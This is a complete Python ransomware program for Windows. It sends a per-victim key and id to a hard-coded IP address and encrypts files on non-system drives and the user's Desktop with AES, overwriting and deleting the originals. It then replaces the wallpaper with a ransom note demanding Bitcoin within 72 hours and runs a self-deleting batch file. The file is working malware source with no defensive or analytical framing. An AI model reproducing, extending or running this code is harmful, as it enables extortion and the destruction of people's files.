import os, random, getpass, shutil, string, urllib, psutil
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
import win32api, win32con, win32gui
import PIL
from PIL import ImageFont
from PIL import Image
from PIL import ImageDraw

def encrypt(key, filename):
  chunksize = 64*1024
  outputFile = os.path.dirname(filename)+"/Pay_Ransom_Or_Forget_"+os.path.basename(filename)
  filesize = str(os.path.getsize(filename)).zfill(16)
  IV = ''

  for i in range(16):
    IV += chr(random.randint(0, 0xFF))

  encryptor = AES.new(key, AES.MODE_CBC, IV)

  with open(filename, 'rb') as infile:
    with open(outputFile, 'wb') as outfile:
      outfile.write(filesize)
      outfile.write(IV)
      
      while True:
        chunk = infile.read(chunksize)
        
        if len(chunk) == 0:
          break
        elif len(chunk) % 16 != 0:
          chunk += ' ' * (16 - (len(chunk) % 16))

        outfile.write(encryptor.encrypt(chunk))
  with open(filename,'w') as oldfile:
    oldfile.write("00000000")
  os.remove(filename)


def decrypt(key, filename):
  chunksize = 64*1024
  outputFile = os.path.dirname(filename)+"/"+os.path.basename(filename)[21:]  
  with open(filename, 'rb') as infile:
    filesize = long(infile.read(16))
    IV = infile.read(16)

    decryptor = AES.new(key, AES.MODE_CBC, IV)

    with open(outputFile, 'wb') as outfile:
      while True:
        chunk = infile.read(chunksize)

        if len(chunk) == 0:
          break

        outfile.write(decryptor.decrypt(chunk))
      outfile.truncate(filesize)


def getKey(password):
  hasher = SHA256.new(password)
  return hasher.digest()

def start_encrypting():
  
  password=''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(16))
  id = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(5))
  urllib.urlopen("http://139.59.8.120?action=enc&id="+id+"&key="+password)
  
  drives=[]
  all_drives=psutil.disk_partitions()
  for drive in all_drives:
    if list(drive)[3]=='rw,fixed' and list(drive)[1][0] != 'C' :
      drives.append(list(drive)[1][0])
  for drive in drives:
    for subdir, dirs, files in os.walk(drive+":/"):
        for file in files:
            try:
              print "Encrypting "+os.path.join(subdir, file)
              encrypt(getKey(password),os.path.join(subdir, file))              
            except Exception as e:
              print e
  for subdir, dirs, files in os.walk("C:/Users/"+getpass.getuser()+"/Desktop/"):
      for file in files:
          try:
            print "Encrypting "+os.path.join(subdir, file)
            encrypt(getKey(password),os.path.join(subdir, file))              
          except Exception as e:
            print e

  shutil.copy("Setup.exe","C:/Users/"+getpass.getuser()+"/Desktop/Setup.exe")
  f=open("D:/Pay_Ransom_Or_Forget_check.bat","w")
  f.write("dnsjknjknja")
  f.close()
  setWallpaper(id)

def start_decrypting():
  password = raw_input("Enter password to decrypt files: ")
  drives=[]
  all_drives=psutil.disk_partitions()
  for drive in all_drives:
    if list(drive)[3]=='rw,fixed' and list(drive)[1][0] != 'C' :
      drives.append(list(drive)[1][0])
  for drive in drives:
    for subdir, dirs, files in os.walk(drive+":/"):
        for file in files:
            if "Pay_Ransom_Or_Forget_" in os.path.join(subdir, file):
              try:
                print "Decrypting "+os.path.join(subdir, file)
                decrypt(getKey(password),os.path.join(subdir, file))
              except Exception as e:
                print e
              os.remove(os.path.join(subdir, file))


  for subdir, dirs, files in os.walk("C:/Users/"+getpass.getuser()+"/Desktop/"):
      for file in files:
          if "Pay_Ransom_Or_Forget_" in os.path.join(subdir, file):
            try:
              print "Decrypting "+os.path.join(subdir, file)
              decrypt(getKey(password),os.path.join(subdir, file))
            except Exception as e:
              print e
            os.remove(os.path.join(subdir, file))              

def setWallpaper(id):
  text="All of your files are encrypted using strong AES encrytion Algorithm.\nYou will need the key to decrypt those files.\nThe key is generated specific to your computer and it\nresides on a secret server on the Internet. There is no other\nway to get your files back. The key will be destroyed after 72 hours\nfrom now. Then your files are as good as deleted.\n\nIn order to decrypt the files you can use the decryter that is\ncopied on your desktop. To obtain the key, transfer the amount of 4 Bitcoins to the\nbitcoin address: 1Bsba32bhHBj3hjb2BHxxsS \nEnter your unique victim id as '"+id+"' and the transaction id in the decrypter.\nThe transaction id will be verified and the you will recieve the key."
  font = ImageFont.truetype("C:/Windows/Fonts/Arial.ttf",50)
  img = Image.new("RGBA", (1920,1080), (120,20,20))
  draw = ImageDraw.Draw(img)
  draw.text((0,0),  text, (255,255,0), font=font)
  draw = ImageDraw.Draw(img)
  img.save("bg.jpg")
  key = win32api.RegOpenKeyEx(win32con.HKEY_CURRENT_USER,"Control Panel\\Desktop",0,win32con.KEY_SET_VALUE)
  win32api.RegSetValueEx(key, "WallpaperStyle", 0, win32con.REG_SZ, "2")
  win32api.RegSetValueEx(key, "TileWallpaper", 0, win32con.REG_SZ, "0")
  win32gui.SystemParametersInfo(win32con.SPI_SETDESKWALLPAPER, "bg.jpg", 1+2)
  os.remove("bg.jpg")


if __name__ == '__main__':
  if os.path.isfile("D:/Pay_Ransom_Or_Forget_check.bat"):
    print "Decrypting"
    start_decrypting()
  else:
    start_encrypting()
    print "Encrypting.."
    with open("del.bat", "w") as delfile:
      delfile.write("@echo off\n")
      delfile.write("timeout /t 2\n")
      delfile.write('del *.exe\n')
      delfile.write('del del.bat')
    os.startfile("del.bat") 


